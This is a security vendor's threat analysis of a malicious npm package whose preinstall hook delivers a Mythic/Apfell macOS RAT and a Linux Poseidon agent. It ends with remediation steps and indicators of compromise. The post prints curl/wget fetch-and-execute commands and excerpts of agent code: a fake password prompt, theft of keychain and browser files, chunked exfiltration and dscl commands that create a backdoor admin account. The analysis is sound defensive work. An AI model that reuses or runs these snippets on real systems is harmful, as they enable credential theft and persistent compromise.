---
excerpt: The JFrog Security Team has identified a malicious npm package named eslint-verify-plugin that deploys a sophisticated multi-stage infection chain, ultimately delivering a full-featured Mythic/Apfell macOS RAT capable of credential theft, screen capture, and backdoor account creation.
title: "Three Stages Deep: A Malicious npm Package Delivering a Full-Featured macOS RAT"
date: "February 18, 2026"
description: "Meitar Palas, JFrog Security Researcher"
tag: "Real Time Post"
img: /img/RealTimePostImage/post/eslint-verify-plugin/thumb.png
type: realTimePost
minutes: '6'

---

The JFrog Security Team has identified a LIVE malicious npm package named `eslint-verify-plugin`. This package masquerades as a legitimate ESLint utility while deploying a sophisticated, multi-stage infection chain targeting macOS and Linux environments.

![](/img/RealTimePostImage/post/eslint-verify-plugin/package_json.png)

## **Technical Analysis: Initial Stages**

### **Stage 1: The Preinstall Hook**

Upon installation, the package triggers `index.js`, which serves as a gatekeeper for the infection. It explicitly filters for non-targeted operating systems:

```javascript
if (platform !== "linux" && platform !== "darwin") process.exit(0);
 
const filename = platform === "linux" ? "x-ya-npmdep_linux.sh" : "x-ya-npmdep_macos.sh";
```

The script writes a platform-specific shell script to disk, sets execution permissions (`chmod 755`), and spawns it as a **detached process**. This allows the `npm install` command to complete silently while the malware continues its execution in the background.
 
### **Stage 2: Payload Delivery Infrastructure**  The package fetches the next stage of the attack from two different endpoints:

| Platform | Payload Source URL | Method |
| :---- | :---- | :---- |
| **macOS** | hxxps\[://\]x-ya\[.\]ru/FvXnR/9a8c2a83f66f49b88e36d28894a34009  | curl |
| **Linux** | hxxps\[://\]functions\[.\]yandexcloud\[.\]net/d4elc6rmqc9fbfsd7m2s?id=3 | curl |

The generated shell scripts each download and execute large obfuscated binaries:

**Mac:**

```shell
(zsh -c "curl -Ls [Payload_URL]| osascript -l JavaScript" &) &
```

**Linux:**

```shell
{ wget --no-check-certificate -q -O ./.node-exporter [Payload_URL] ||  curl -k -o ./.node-exporter -sO [Payload_URL]; } ; chmod +x ./.node-exporter && (exec -a node-exporter ./.node-exporter &)
```

![](/img/RealTimePostImage/post/eslint-verify-plugin/VT_screenshot.png)

### **Stage 3: The Final Payloads**

### Linux final payload:

 A malicious binary **`node-exporter`** (4a37a431b3768824e31622d5eb9ad7505fa0afdbbec8d0505d41c1c3af37bc5a) served by the Yandex Cloud function (hxxps\[://\]x-ya\[.\]ru/FvXnR/node-exporter) is piped directly to bash for execution.

The binary **`node-exporter`** is a Poseidon agent for the Mythic C2 framework, a well-known open-source post-exploitation platform. It is classified as a trojan/backdoor (threat category: trojan family).   
It is a 64-bit ELF binary written in Go, disguised as the legitimate Prometheus node-exporter monitoring tool.   
Furthermore it communicates over HTTPS with `functions\[.\]yandexcloud\[.\]net`, abusing Yandex Cloud Functions as C2 infrastructure.   
The binary is not packed. Poseidon supports a full range of post-exploitation capabilities including file operations, credential harvesting, and lateral movement.   
**Currently 26/65 vendors on VirusTotal flag it as malicious**.

### MacOS final payload

The downloaded obfuscated script (obfuscated with Obfuscator.io/javascript-obfuscator, featuring string array rotation, hex-renamed identifiers, and proxy wrapper functions) executes a Mythic/Apfell open source C2 agent using `osascript -l JavaScript`

![](/img/RealTimePostImage/post/eslint-verify-plugin/obfuscated_code.png)

#### **What gets stolen \- data exfiltration deep dive**

Once the Mythic agent ([https://github.com/its-a-feature/Mythic](https://github.com/its-a-feature/Mythic)) is running, the attacker can remotely trigger data collection commands. But even before any commands are issued, the agent immediately fingerprints the victim machine on `initialization.Host` fingerprinting on startup.  
The payload itself is an Apfell agent ([https://github.com/MythicAgents/apfell](https://github.com/MythicAgents/apfell)), Mythic's JXA (JavaScript for Automation) implant designed for macOS. This is evident from the code The agent constructor harvests system information the moment it is instantiated, before any C2 communication begins:

```javascript
class agent {
    constructor() {
        this.procInfo = $.NSProcessInfo.processInfo;
        this.hostInfo = $.NSHost.currentHost;
        this.id = "";
        this.user = ObjC.deepUnwrap(this.procInfo.userName);
        this.fullName = ObjC.deepUnwrap(this.procInfo.fullUserName);
        this.ip = ObjC.deepUnwrap(this.hostInfo.addresses).sort()
                      .filter((a) => a !== "127.0.0.1");
        this.pid = this.procInfo.processIdentifier;
        this.host = ObjC.deepUnwrap(this.hostInfo.names);
        this.environment = ObjC.deepUnwrap(this.procInfo.environment);
        this.uptime = this.procInfo.systemUptime;
        this.args = ObjC.deepUnwrap(this.procInfo.arguments);
        this.osVersion = this.procInfo.operatingSystemVersionString.js;
        this.uuid = "6a5562b3-431f-49c5-a17d-41adce6caded";
        this.checked_in = false;
    }
}
```

This collects the username, full display name, all non-loopback IP addresses, hostname, the entire environment variable set (PATH, HOME, AWS keys, tokens \-- anything exported), process arguments, OS version, and system uptime. All of this is sent to the C2 server during the initial checkin, giving the attacker a complete profile of the target before issuing a single command.

Beyond this passive collection, the agent targets several high-value categories via remote commands:

**Credential stealing via fake password dialog.** The agent displays a native macOS dialog that mimics a system password prompt. The `hiddenAnswer: true` flag masks the input, making it indistinguishable from a real OS prompt:

![](/img/RealTimePostImage/post/eslint-verify-plugin/demo_prompt2.png)

```javascript
var result = currentApp.displayDialog(
    "User's password is required to proceed.",
    {
        withTitle: title || "CustomTitle",
        withIcon: icon || "caution",
        buttons: ["OK", "Cancel"],
        defaultButton: "OK",
        hiddenAnswer: true
    }
);
return JSON.stringify({ user: apfell.user, password: result.textReturned });
```

The victim sees what looks like a routine macOS password request. Whatever they type gets sent straight to the C2 server along with their username.

**Browser bookmarks.** The agent reads Chrome's bookmark JSON directly from disk and recursively walks the bookmark tree, extracting every URL with its folder and title:

```javascript
var chromePath = ObjC.unwrap($.NSHomeDirectory()) +
    "/Library/Application Support/Google Chrome/Default/Bookmarks";

function parseBookmarkFolder(folder, folderName) {
    for (var i = 0; i < folder.children.length; i++) {
        var child = folder.children[i];
        if (child.type === "url") {
            results.push({ "Folder Name": folderName, title: child.name, url: child.url });
        } else if (child.type === "folder") {
            parseBookmarkFolder(child, child.name);
        }
    }
}
```

This reveals the victim's internal tools, dashboards, admin panels, cloud consoles, and corporate resources, all useful for lateral movement.

**Clipboard contents.** A single call reads whatever the victim last copied \-- passwords, API keys, seed phrases, internal URLs:

```javascript
var pasteboard = $.NSPasteboard.generalPasteboard;
var content = pasteboard.stringForType($.NSPasteboardTypeString);
```

**File exfiltration**. The agent leaks the following files  \-

*  /Library/Keychains/login.keychain-db  
* /Library/Application Support/Google/Chrome/Default/Cookies  
*  /Library/Application Support/Google/Chrome/Default/Login Data  
*  /Library/Application Support/Google Chrome/Default/Bookmarks

Files are read, base64-encoded, chunked into 512KB segments, and uploaded to the C2 server piece by piece:

```javascript
var fileData = $.NSFileHandle.fileHandleForReadingAtPath(filePath).readDataToEndOfFile;
var base64Data = fileData.base64EncodedStringWithOptions(0);

var chunkSize = 512000;
var totalChunks = Math.ceil(base64Data.length / chunkSize);
for (var chunkNum = 0; chunkNum < totalChunks; chunkNum++) {
    var chunk = base64Data.slice(chunkNum * chunkSize, (chunkNum + 1) * chunkSize);
    C2.postResponse(task.id, { download: { chunk_data: chunk, chunk_num: chunkNum, total_chunks: totalChunks }});
}
```

This chunked approach lets the attacker exfiltrate large files (SSH keys, wallets, databases) without triggering size-based network alerts.

**Screenshots.** The agent silently captures the display using `screencapture -x` (the \-x flag suppresses the shutter sound), uploads the image, then deletes the temp file:

```javascript
var tmpFile = "/tmp/" + get_random_string(10) + ".png";
currentApp.doShellScript("screencapture -x " + tmpFile);
var fileData = $.NSData.alloc.initWithContentsOfFile(tmpFile);
var b64 = ObjC.unwrap(fileData.base64EncodedStringWithOptions(0));
$.NSFileManager.defaultManager.removeItemAtPathError(tmpFile, null);
```

**Filesystem reconnaissance.** The ls command returns full metadata for every file \-- permissions, owner, UID, group, file type, creation/modification dates, and hidden status \-- giving the attacker a detailed map of the target system:

```javascript
results.push({
    name: ObjC.unwrap(item),
    permission: ObjC.unwrap(attrs.objectForKey($.NSFilePosixPermissions)),
    size: ObjC.unwrap(attrs.objectForKey($.NSFileSize)),
    user: ObjC.unwrap(attrs.objectForKey($.NSFileOwnerAccountName)),
    type: ObjC.unwrap(attrs.objectForKey($.NSFileType)),
    isHidden: ObjC.unwrap(attrs.objectForKey("NSFileExtensionHidden"))
});
```

**Backdoor account creation.** Perhaps the most aggressive capability: the agent can create a new macOS user with admin privileges, a home directory, and a password, all via `dscl` commands run with stolen admin credentials:

```javascript
currentApp.doShellScript("dscl . create /Users/" + username + " UserShell " + shell,
    { administratorPrivileges: true, userName: adminUser, password: adminPass });
currentApp.doShellScript("dseditgroup -o edit -a " + username + " -t user admin",
    { administratorPrivileges: true, userName: adminUser, password: adminPass });
currentApp.doShellScript("mkdir \"" + homeDir + "\"",
    { administratorPrivileges: true, userName: adminUser, password: adminPass });
```

This creates persistent access that survives even if the original agent is discovered and removed.

## **Remediation**

Affected users who installed this package should:

1. **Uninstall the malicious package**  `npm uninstall eslint-verify-plugin` 
2. **Isolate & Audit:** Check for unauthorized user accounts via `dscl . list /Users`  
3. **Credential Rotation:** Immediately change all passwords and rotate SSH keys, API tokens, and session cookies.  
4. **Persistence Check:** Inspect LaunchAgents and LaunchDaemons for suspicious `.plist` files.
If present, its `ProgramArguments` will contain `/usr/bin/osascript -l JavaScript -e` with an embedded URL fetching the Mythic payload. Remove the `plist` file to disable persistence.   
5. **Security Baseline:** Re-image affected machines if possible to ensure all hidden backdoors are removed.

## **Conclusions**

The **eslint-verify-plugin** package is a direct example of how a malicious npm package can escalate from a simple installation hook to a full-system compromise. By masquerading as a legitimate utility, the attackers successfully concealed a multi-stage infection chain.

The capabilities of the Mythic/Apfell RAT deployed here \- ranging from silent screen captures and credential harvesting to the creation of administrative backdoors-demonstrate the high level of control an attacker gains through this vector. This case confirms that the preinstall hook remains a critical entry point for persistent, platform-specific malware targeting both macOS and Linux environments.

This package is already detected by JFrog Xray and JFrog Curation, under the Xray ID listed in the IoC section below.

##  **Indicators of Compromise (IOCs):** 

| Indicator | Value |
| :---- | :---- |
| Package Name | eslint-verify-plugin  |
| NPM Version | 1.4.3 |
| XRAY-ID | XRAY-943671 |
| C2 Shortlink | hxxps\[://\]x-ya\[.\]ru/FvXnR/a5aef90 |
| AES PSK (Base64) | EGEqvmewqbDmt/y+YTXh/2tpQ4hME0SMKsuF/lY51p0= |
| Agent UUID | 6a5562b3-431f-49c5-a17d-41adce6caded |
| Kill Date | 2027-02-10 |
| C2 URI Path | d4erloflq56bidfugr9m |
| Framework | Mythic / Apfell (JXA)6 |
| Linux Binary Name  | node-exporter  |
| Linux Binary SHA256 | 4a37a431b3768824e31622d5eb9ad7505fa0afdbbec8d0505d41c1c3af37bc5a  |
| Linux Binary URL | hxxps\[://\]x-ya\[.\]ru/FvXnR/node-exporter  |
| Linux Payload Source | hxxps\[://\]functions\[.\]yandexcloud\[.\]net/d4elc6rmqc9fbfsd7m2s?id=3  |

